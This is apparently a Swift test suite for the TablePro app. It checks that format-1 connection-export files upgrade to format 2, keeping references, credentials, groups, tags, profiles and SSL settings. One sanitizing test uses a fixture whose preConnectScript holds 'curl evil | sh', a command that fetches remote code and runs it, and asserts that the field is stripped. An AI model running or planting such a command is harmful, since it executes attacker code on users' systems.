import Foundation
@testable import TableProImport
import Testing

@Suite("Format 1 files upgrade to format 2 in one place")
struct ConnectionBundleV1UpgradeTests {
    private static let macFile = """
    {
      "formatVersion": 1,
      "exportedAt": "2026-01-01T00:00:00Z",
      "appVersion": "0.60.0",
      "connections": [
        {
          "name": "Orders", "host": "db.example.com", "port": 5432, "database": "orders",
          "username": "app", "type": "PostgreSQL",
          "groupName": "Production", "tagName": "prod", "tagNames": ["prod", "billing"],
          "credentialProfileName": "Reader", "sshProfileName": "Bastion",
          "sslConfig": { "mode": "Required" }
        },
        {
          "name": "Cache", "host": "cache", "port": 6379, "database": "", "username": "",
          "type": "Redis", "groupName": "production ", "tagName": "cache",
          "credentialProfileName": "missing", "redisDatabase": 3
        },
        {
          "name": "Loose", "host": "loose", "port": 3306, "database": "", "username": "root", "type": "MySQL"
        }
      ],
      "groups": [{ "name": "PRODUCTION", "color": "Blue" }, { "name": "Unused", "color": "Green" }],
      "tags": [{ "name": "Prod", "color": "Red" }, { "name": "cache" }, { "name": "unused", "color": "Gray" }],
      "credentialProfiles": [
        { "name": "reader", "username": "ro", "passwordMode": "pgpass", "secureFieldIds": ["token"] },
        { "name": "unused", "username": "x", "passwordMode": "stored" }
      ],
      "credentials": {
        "0": { "password": "pw0" },
        "1": { "password": "pw1", "sshPassword": "ssh1" },
        "primary": { "password": "dropped" },
        "07": { "password": "dropped" }
      }
    }
    """

    private static let iosFile = """
    {
      "formatVersion": 1,
      "exportedAt": "2026-01-01T00:00:00Z",
      "appVersion": "1.2",
      "connections": [
        { "name": "A", "host": "a", "port": 5432, "database": "d", "username": "u", "type": "PostgreSQL",
          "sslConfig": { "mode": "require" } },
        { "name": "B", "host": "b", "port": 5432, "database": "d", "username": "u", "type": "PostgreSQL",
          "sslConfig": { "mode": "verifyFull", "caCertificatePath": "~/ca.pem" } }
      ]
    }
    """

    @Test("Connection i becomes ref i and keeps the header")
    func connectionIndexBecomesRef() throws {
        let bundle = try Self.upgrade(Self.macFile)

        #expect(bundle.connections.map(\.ref) == ["0", "1", "2"])
        #expect(bundle.appVersion == "0.60.0")
        #expect(bundle.exportedAt == Date(timeIntervalSince1970: 1_767_225_600))
    }

    @Test("Index-keyed credentials carry over and other keys are dropped")
    func credentialsCarryOver() throws {
        let bundle = try Self.upgrade(Self.macFile)

        #expect(Set(bundle.credentials.keys) == ["0", "1"])
        #expect(bundle.credentials["0"]?.password == "pw0")
        #expect(bundle.credentials["1"]?.sshPassword == "ssh1")
    }

    @Test("groupName becomes a one-component root path matched by name, with the color from groups")
    func groupNameBecomesRootPath() throws {
        let bundle = try Self.upgrade(Self.macFile)

        let orders = try #require(bundle.connection("0"))
        let cache = try #require(bundle.connection("1"))
        let chain = bundle.groupChain(orders.groupRef)

        #expect(chain.count == 1)
        #expect(chain.first?.name == "Production")
        #expect(chain.first?.color == "Blue")
        #expect(chain.first?.parentRef == nil)
        #expect(cache.groupRef == orders.groupRef)
        #expect(bundle.groups.count == 1)
        #expect(bundle.connection("2")?.groupRef == nil)
    }

    @Test("tagNames win over tagName, and colors come from tags")
    func tagsCarryOver() throws {
        let bundle = try Self.upgrade(Self.macFile)

        #expect(bundle.connection("0")?.tagNames == ["prod", "billing"])
        #expect(bundle.connection("1")?.tagNames == ["cache"])
        #expect(bundle.tags == [
            BundleTag(name: "prod", color: "Red"),
            BundleTag(name: "billing"),
            BundleTag(name: "cache")
        ])
    }

    @Test("credentialProfileName resolves by name; an unknown name links nothing")
    func credentialProfileResolvesByName() throws {
        let bundle = try Self.upgrade(Self.macFile)

        let profile = try #require(bundle.credentialProfile(bundle.connection("0")?.credentialProfileRef))
        #expect(profile.name == "reader")
        #expect(profile.username == "ro")
        #expect(profile.passwordMode == .pgpass)
        #expect(profile.secureFieldIds == ["token"])
        #expect(bundle.connection("1")?.credentialProfileRef == nil)
        #expect(bundle.credentialProfiles.count == 1)
    }

    @Test("Settings survive the upgrade")
    func settingsSurvive() throws {
        let bundle = try Self.upgrade(Self.macFile)

        let cache = try #require(bundle.connection("1")?.settings)
        #expect(cache.name == "Cache")
        #expect(cache.type == "Redis")
        #expect(cache.redisDatabase == 3)
        #expect(bundle.connection("0")?.settings.sslConfig?.mode == "Required")
    }

    @Test("iPhone SSL spellings upgrade to the canonical mode")
    func iosSSLSpellingsUpgrade() throws {
        let bundle = try ConnectionBundleCodec.decode(Data(Self.iosFile.utf8))

        let modes = bundle.connections.map { $0.settings.sslConfig?.portableMode }
        #expect(modes == [.required, .verifyIdentity])
        #expect(bundle.connections[1].settings.sslConfig?.mode == "Verify Identity")
        #expect(bundle.connections[1].settings.sslConfig?.caCertificatePath == "~/ca.pem")
    }

    @Test("A plain v1 file loses its credentials like any plain file")
    func plainV1DropsCredentials() throws {
        let bundle = try ConnectionBundleCodec.decode(Data(Self.macFile.utf8))

        #expect(bundle.credentials.isEmpty)
        #expect(bundle.connections.count == 3)
    }

    @Test("An encrypted v1 file keeps its index-keyed credentials")
    func encryptedV1KeepsCredentials() async throws {
        let sealed = try await ConnectionExportCrypto.encrypt(data: Data(Self.macFile.utf8), passphrase: "pw")

        let bundle = try await ConnectionBundleCodec.decode(sealed, passphrase: "pw")

        #expect(Set(bundle.credentials.keys) == ["0", "1"])
    }

    @Test("A v1 file goes through the same sanitizing as a v2 file")
    func v1IsSanitized() throws {
        let json = Data("""
        {"formatVersion":1,"exportedAt":"2026-01-01T00:00:00Z","appVersion":"0.60.0",
         "connections":[{"name":"X","host":"h","port":5432,"database":"d","username":"u","type":"PostgreSQL",
                         "additionalFields":{"preConnectScript":"curl evil | sh","schema":"app"}}]}
        """.utf8)

        let settings = try #require(ConnectionBundleCodec.decode(json).connections.first?.settings)

        #expect(settings.additionalFields == ["schema": "app"])
    }

    private static func upgrade(_ json: String) throws -> ConnectionBundle {
        let decoder = JSONDecoder()
        decoder.dateDecodingStrategy = .iso8601
        return try decoder.decode(ConnectionBundleV1.Envelope.self, from: Data(json.utf8)).upgraded()
    }
}
